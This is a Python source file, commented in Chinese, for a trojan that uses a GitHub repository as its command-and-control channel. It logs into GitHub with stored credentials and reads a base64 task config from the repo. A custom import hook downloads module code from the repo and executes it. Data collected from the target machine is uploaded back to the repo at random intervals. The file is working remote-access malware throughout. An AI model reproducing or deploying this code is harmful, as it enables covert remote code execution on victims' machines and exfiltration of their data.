# encoding: utf-8
"""
基于 GitHub 通信的木马
"""
import json
import base64
import sys
import time
import random
import threading
import imp
import queue
import os

from unit7 import inf
from github3 import login

trooo_id = "abc"

trooo_config = "{}.json".format(trooo_id)
data_path = "data/{}/".format(trooo_id)
trooo_modules = []
configured = False
task_queue = queue.Queue()


def connect_to_github():
    """
    用户认证,获得当前的 repo 和 branch 的对象提供给其他函数使用
    需要尽量混淆认证函数的代码，避免账号和口令的泄露
    """
    gh = login(username=inf.Username, password=inf.Password)
    repo = gh.repository(inf.Username, inf.Repository)
    branch = repo.branch(inf.Branch)

    # print("login gh:{}, repo:{}, branch:{}".format(gh,repo,branch))

    return gh, repo, branch


def get_file_contents(filepath):
    """
    从远程的 repo 中抓取文件，然后将文件读取到本地变量中
    读取配置文件和模块的源代码时使用
    """
    gh, repo, branch = connect_to_github()
    tree = branch.commit.commit.tree.recurse()     # 递归 branch 分支中所有的文件
    # print("tree content:",tree)
    # print("tree.tree content:", tree.tree)
    for filename in tree.tree:
        # print("filename: ",filename)
        # print("filename.path: ",filename.path)
        if filepath in filename.path:
            print("[*] Found file {}".format(filepath))
            blob = repo.blob(filename._json_data['sha'])
            # print("blob content:", base64.b64decode(blob.content))
            return blob.content
    return None


def get_trooo_config():
    """
    获得 repo 中远程配置文件
    木马解析其中的内容获得需要运行的模块名称
    """
    global configured
    config_json = get_file_contents(trooo_config)
    # print("config_json: ",config_json)
    # print("config_json编码之后：",base64.b64decode(config_json))
    config = json.loads(base64.b64decode(config_json))
    # print("config: ",config)
    configured = True

    for task in config:
        if task['module'] not in sys.modules:
            exec("import %s" % task['module'])
    return config


def store_module_result(data):
    """
    将我们从目标机器上收集的数据推送到 repo 中
    """
    gh, repo, branch = connect_to_github()
    remote_path = "data/{}/{}.data".format(trooo_id, random.randint(10,100000))
    repo.create_file(remote_path, "Commit message", base64.b64encode(data.encode('utf-8')))
    return


def module_runner(module):
    task_queue.put(1)
    result = sys.modules[module].run()
    task_queue.get()
    print(result)
    store_module_result(result)
    return


class GitImporter(object):
    """
    当 Python 解释器尝试加载不存在的模块时 GitImporter 类就会被调用
    首先执行 find_module 尝试获得模块所在位置
    之后 Python 解释器调用 load_module 函数完成模块的实际加载
    """
    def __init__(self):
        self.current_module_code = ""

    # 尝试获取模块所在位置
    def find_module(self, fullname, path=None):
        if configured:
            print("[*] Attempting to retrieve %s" % fullname)
            new_library = get_file_contents("modules/%s" % fullname)

            if new_library is not None:
                # print(base64.b64decode(new_library).decode())
                self.current_module_code = base64.b64decode(new_library).decode()
                return self
        return None

    def load_module(self, name):
        module = imp.new_module(name)
        exec(self.current_module_code, module.__dict__)
        sys.modules[name] = module
        return module


def main():
    sys.meta_path.insert(0, GitImporter())
    while True:
        if task_queue.empty():
            config = get_trooo_config()
            for task in config:
                t = threading.Thread(target=module_runner, args=(task['module'],))
                t.start()
                time.sleep(random.randint(1,10))

        time.sleep(random.randint(100,10000))


if __name__ == '__main__':
    # print(sys.modules)
    main()